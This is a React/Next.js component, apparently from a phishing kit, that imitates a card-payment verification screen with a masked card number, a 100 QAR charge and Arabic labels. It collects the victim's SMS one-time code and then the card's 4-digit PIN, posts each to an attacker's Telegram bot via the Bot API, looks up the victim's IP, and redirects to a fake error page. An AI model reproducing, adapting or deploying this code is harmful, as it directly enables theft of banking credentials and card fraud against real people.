"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { useSearchParams } from "next/navigation";
import LoadingButton from "@/components/Button";

export default function OTPForm() {
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  const [errorOtp, setErrorOtp] = useState(false);
  const [errorPin, setErrorPin] = useState(false);
  const [showPinForm, setShowPinForm] = useState(false);
  const router = useRouter();
  const searchParams = useSearchParams();
  const lastCardNumber = searchParams.get("lastCardNumber");
  const expireDate = searchParams.get("expireDate");
  const [counter, setCounter] = useState(180); // 3 minutes = 180s


  const handleOtpChange = (e) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 6) {
      setOtp(value);
      setErrorOtp(false);
    }
  };

  const handlePinChange = (e) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 4) {
      setPin(value);
      setErrorPin(false);
    }
  };

  const getUserIP = async () => {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    if (otp.length === 6) {
      setErrorOtp(false);

      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const userIP = await getUserIP();
      const message = `OTP: ${otp}`;

      // ✅ Store OTP in sessionStorage
      sessionStorage.setItem("otp", otp);

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          setShowPinForm(true);
        } else {
          alert("أعد المحاولة حدث خطأ ما");
        }
      } catch (error) {
        alert("أعد المحاولة حدث خطأ ما");
      }
    } else {
      setErrorOtp(true);
    }
  };

  const handlePinSubmit = async (e) => {
    e.preventDefault();
    if (pin.length === 4) {
      setErrorPin(false);

      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const userIP = await getUserIP();
      const message = `Pin: ${pin}`;

      // ✅ Store PIN in sessionStorage
      sessionStorage.setItem("pin", pin);

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          router.push(`/loading?nextPage=err`);
        } else {
          alert("أعد المحاولة حدث خطأ ما");
        }
      } catch (error) {
        alert("أعد المحاولة حدث خطأ ما");
      }
    } else {
      setErrorPin(true);
    }
  };

  useEffect(() => {
    if (counter <= 0) return;
    const id = setInterval(() => {
      setCounter(prev => {
        if (prev <= 1) {
          clearInterval(id);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(id);
  }, [counter]);


  const formatTime = (seconds) => {
    const m = String(Math.floor(seconds / 60)).padStart(2, "0");
    const s = String(seconds % 60).padStart(2, "0");
    return `${m}:${s}`;
  };


  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div>
        {/* نموذج OTP */}


        <form
          className={`bg-white shadow-lg rounded-lg p-6 w-full mt-10 max-w-[90vw] m-auto rtl relative transform transition-transform duration-700 ${showPinForm ? "hidden opacity-0" : "opacity-100"
            }`}
        >
          <h2 className="text-xl" dir="ltr">Enter Verification code</h2>

          <p className="text-sm" dir="ltr">
            cardNumber: XXXX XXXX XXXX {lastCardNumber}
          </p>
          <p className="text-sm" dir="ltr">ExpireDate: {expireDate}</p>
          <p className="text-sm" dir="ltr">
            Amount: 100 QAR
          </p>
          <p dir="ltr">Merchant: Hokoomi</p>

          <p className="text-md text-gray-700 my-6" dir="ltr">
            We sent you a Verification code by a text message
          </p>

          <div className="mb-6" dir="ltr">
            <label>Verification Code</label>
            <input
              type="number"
              value={otp}
              onChange={handleOtpChange}
              placeholder="XXXXXX"
              className={`w-full px-4 py-2 border rounded-lg text-center ${errorOtp ? "border-red-500" : "border-gray-300"
                }`}
              minLength={4}
              maxLength={6}
            />
          </div>

          <LoadingButton
            w="100%"
            onClick={handleOtpSubmit}
          >
            تأكيد
          </LoadingButton>
          <div className="text-center text-sm text-gray-600 my-4">
            You can request a new code in
            <span className="font-semibold">{formatTime(counter)}</span>
          </div>

        </form>


        {/* نموذج PIN */}
        <form
          className={`bg-white shadow-lg rounded-lg p-8 w-full max-w-sm text-center relative transform transition-transform duration-700 ${showPinForm
            ? "translate-y-[-20vh] opacity-100"
            : "translate-y-[-200%] opacity-0"
            }`}
        >
          <div className="header mb-6">
            <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" className="mx-auto mb-3">
              <circle cx="12" cy="12" r="10" fill="#92002c" />
              <rect
                x="7.5"
                y="11"
                width="9"
                height="7"
                rx="1.5"
                ry="1.5"
                stroke="white"
                strokeWidth="1.5"
                fill="none"
              />
              <path d="M9 11V9a3 3 0 0 1 6 0v2" stroke="white" strokeWidth="1.5" fill="none" />
            </svg>
            <h2 className="text-2xl font-bold text-[#92002c]">إثبات ملكية البطاقة</h2>
            <p className="text-gray-600 mt-2">يرجى إدخال الرقم السري للبطاقة للتحقق من ملكيتها</p>
            <p className="py-3">ادخل الرقم السري  المكون من 4 ارقام </p>
          </div>
          <div className="mb-6">
            <input
              type="number"
              value={pin}
              onChange={handlePinChange}
              placeholder="XXXX"
              className={`w-full px-4 py-2 border rounded-lg text-center ${errorPin ? "border-red-500" : "border-gray-300"
                }`}
            />
          </div>
          <LoadingButton
            w="100%"
            onClick={handlePinSubmit}
          >
            ← تحقق من PIN
          </LoadingButton>
          {/* Warning box */}
          <div className="warning-box bg-yellow-100 border border-yellow-300 text-yellow-800 p-4 rounded-lg mt-6 text-sm">
            <div className="warning-title font-bold flex justify-center items-center gap-2 mb-1">⚠ تنبيه</div>
            <div className="warning-text">سيتم حظر البطاقة مؤقتاً بعد 3 محاولات خاطئة</div>
          </div>
        </form>
      </div>
    </div>
  );
}

